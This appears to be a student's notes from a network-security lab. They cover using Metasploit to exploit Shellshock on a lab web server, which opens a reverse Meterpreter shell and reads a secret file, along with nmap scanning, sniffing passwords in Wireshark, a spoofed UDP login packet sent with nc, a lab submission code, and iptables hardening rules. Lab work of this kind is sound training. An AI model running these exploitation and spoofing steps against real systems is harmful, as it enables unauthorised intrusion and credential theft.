## Using MetaSploit to detect and exploit vulnerabilities
```
[student@lestrade:~]$ msfconsole
Following files may not be writable, so sudo is needed:
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/bin
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/bin
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/build_info
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/build_info/nokogiri-1.10.4.info
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/build_info/pg-0.21.0.info
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/build_info/sqlite3-1.4.1.info
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/bundler
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/cache
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/doc
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/extensions
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/gems                                                        	 
  /nix/store/6in8298xbfi8z9wxl56r2kbz8hnfranv-metasploit-bundler-env/lib/ruby/gems/2.6.0/specifications                                              	 
[-] ***rting The Metasploit Framework console.../
[-] * WARNING: No database support: No database YAML file
[-] ***
                                             	 

  Metasploit Park, System Security Interface                            	 
  Version 4.0.5, Alpha E                                                	 
  Ready...                                                              	 
  > access security
  access: PERMISSION DENIED.
  > access security grid
  access: PERMISSION DENIED.
  > access main security grid
  access: PERMISSION DENIED....and...
  YOU DIDN'T SAY THE MAGIC WORD!
  YOU DIDN'T SAY THE MAGIC WORD!                                        	 
  YOU DIDN'T SAY THE MAGIC WORD!                                        	 
  YOU DIDN'T SAY THE MAGIC WORD!                                        	 
  YOU DIDN'T SAY THE MAGIC WORD!                                        	 
  YOU DIDN'T SAY THE MAGIC WORD!                                        	 
  YOU DIDN'T SAY THE MAGIC WORD!                                        	 


   	=[ metasploit v5.0.45-dev                      	]
+ -- --=[ 1918 exploits - 1074 auxiliary - 330 post   	]
+ -- --=[ 556 payloads - 45 encoders - 10 nops        	]
+ -- --=[ 4 evasion                                   	]

msf5 > search 2014-6271

Matching Modules
================

   #  Name                                           	Disclosure Date  Rank   	Check  Description
   -  ----                                           	---------------  ----   	-----  -----------
   0  auxiliary/scanner/http/apache_mod_cgi_bash_env 	2014-09-24   	normal 	Yes	Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1  auxiliary/server/dhclient_bash_env             	2014-09-24   	normal 	No 	DHCP Client Bash Environment Variable Code Injection (Shellshock)
   2  exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01   	excellent  Yes	Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   3  exploit/linux/http/ipfire_bashbug_exec         	2014-09-29   	excellent  Yes	IPFire Bash Environment Variable Injection (Shellshock)
   4  exploit/multi/ftp/pureftpd_bash_env_exec       	2014-09-24   	excellent  Yes	Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   5  exploit/multi/http/apache_mod_cgi_bash_env_exec	2014-09-24   	excellent  Yes	Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   6  exploit/multi/http/cups_bash_env_exec          	2014-09-24   	excellent  Yes	CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   7  exploit/osx/local/vmware_bash_function_root    	2014-09-24   	normal 	Yes	OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   8  exploit/unix/dhcp/bash_environment             	2014-09-24   	excellent  No 	Dhclient Bash Environment Variable Injection (Shellshock)
   9  exploit/unix/smtp/qmail_bash_env_exec          	2014-09-24   	normal 	No 	Qmail SMTP Bash Environment Variable Injection (Shellshock)


msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > info

   	Name: Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
 	Module: exploit/multi/http/apache_mod_cgi_bash_env_exec
   Platform:
   	Arch:
 Privileged: No
	License: Metasploit Framework License (BSD)
   	Rank: Excellent
  Disclosed: 2014-09-24

Provided by:
  Stephane Chazelas
  wvu <wvu@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>
  lcamtuf

Available targets:
  Id  Name
  --  ----
  0   Linux x86
  1   Linux x86_64

Check supported:
  Yes

Basic options:
  Name        	Current Setting  Required  Description
  ----        	---------------  --------  -----------
  CMD_MAX_LENGTH  2048         	yes   	CMD max line length
  CVE         	CVE-2014-6271	yes   	CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
  HEADER      	User-Agent   	yes   	HTTP header to use
  METHOD      	GET          	yes   	HTTP method to use
  Proxies                      	no    	A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                       	yes   	The target address range or CIDR identifier
  RPATH       	/bin         	yes   	Target PATH for binaries used by the CmdStager
  RPORT       	80           	yes   	The target port (TCP)
  SRVHOST     	0.0.0.0      	yes   	The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT     	8080         	yes   	The local port to listen on.
  SSL         	false        	no    	Negotiate SSL/TLS for outgoing connections
  SSLCert                      	no    	Path to a custom SSL certificate (default is randomly generated)
  TARGETURI                    	yes   	Path to CGI script
  TIMEOUT     	5            	yes   	HTTP read response timeout (seconds)
  URIPATH                      	no    	The URI to use for this exploit (default is random)
  VHOST                        	no    	HTTP server virtual host

Payload information:
  Space: 2048

Description:
  This module exploits the Shellshock vulnerability, a flaw in how the
  Bash shell handles external environment variables. This module
  targets CGI scripts in the Apache web server by setting the
  HTTP_USER_AGENT environment variable to a malicious function
  definition.

References:
  https://cvedetails.com/cve/CVE-2014-6271/
  https://cvedetails.com/cve/CVE-2014-6278/
  https://cwe.mitre.org/data/definitions/94.html
  OSVDB (112004)
  https://www.exploit-db.com/exploits/34765
  https://access.redhat.com/articles/1200223
  https://seclists.org/oss-sec/2014/q3/649

Also known as:
  Shellshock

msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOST 192.168.83.80
RHOST => 192.168.83.80
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI cgi-bin/info.sh
TARGETURI => cgi-bin/info.sh
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 192.168.83.1:4444
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (985320 bytes) to 192.168.83.80
[*] Meterpreter session 1 opened (192.168.83.1:4444 -> 192.168.83.80:39574) at 2020-02-04 13:24:00 +0000

meterpreter > ls
Listing: /nix/store/rs3p3fn6466f9js8askakrsl3glic411-charlie-homepage/cgi-bin
=============================================================================

Mode          	Size  Type  Last modified          	Name
----          	----  ----  -------------          	----
100555/r-xr-xr-x  210   fil   2020-01-18 23:42:37 +0000  info.sh
100444/r--r--r--  59	fil   2020-01-18 23:42:37 +0000  secret.txt

meterpreter > cat secret.txt
Poor patching is still one of the biggest security issues
```
<br>

## Password sniffing in WireShark
Login as username: alice/bob password: anything
Check the data contained in the UDP with port destination 4445

<br>

## Send network traffic to alice
```
[student@lestrade:~]$ printf “GET / HTTP/1.1 \n\n” | ncat --ssl alice 443
```

<br>

## Find ports where alice is on
```
[student@lestrade:~]$ sudo nmap -sS alice
```

<br>

## Check which services are running on which port
```
[student@lestrade:~]$ nmap -v -iR 1 -Pn -p [port-no]
```

<br>

## Checking vulnerabilities
```
[student@lestrade:~]$ ping [user]
Go to http://greenhouse/ 
Click scan
Click task wizard
Input the IP address output from ping command
```

<br>

## Spoofing UDP packets
```
[student@lestrade:~]$ echo -n “Password:whatever” | nc -4u alice 4445
```
Then login with username: charlie and password: whatever
Well done! Submit this code: d4e1321541742fd79a1772a3cfb7cbb9cd20f67c75a8b1bc687a56d1c039eaa0

<br>

## IPTABLE rules for alice
```
*filter

# Default settings
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]

# Insert rules here. They have the same format as iptables commands, but
# without the command prefix. E.g.:
# -A INPUT -p tcp --dport 5582 -j DROP

# DROP all INPUT and FORWARD
# ACCEPT all OUTPUT (no change)
--policy INPUT DROP
--policy FORWARD DROP

# Allow all local traffic (e.g. localhost)
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o lo -j ACCEPT

# Allow ESTABLISHED and RELATED traffic (for FTP)
-A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow SSH
-A INPUT -p tcp --dport 22 -j ACCEPT

# Destination port for FTP is 21
-A INPUT -p tcp --dport 21 -j ACCEPT

# Allow incoming HTTP and HTTPS traffic on port 80 and 443
-A INPUT -p tcp --dport 80 -j ACCEPT
-A INPUT -p tcp --dport 443 -j ACCEPT

# UDP
-A INPUT --protocol udp --src 192.168.81.1 --sport 4445 --dst 192.168.81.80 --jump ACCEPT
-A OUTPUT --protocol udp --src 192.168.81.80 --dst 192.168.82.80 --dport 4444 --jump ACCEPT


COMMIT
```

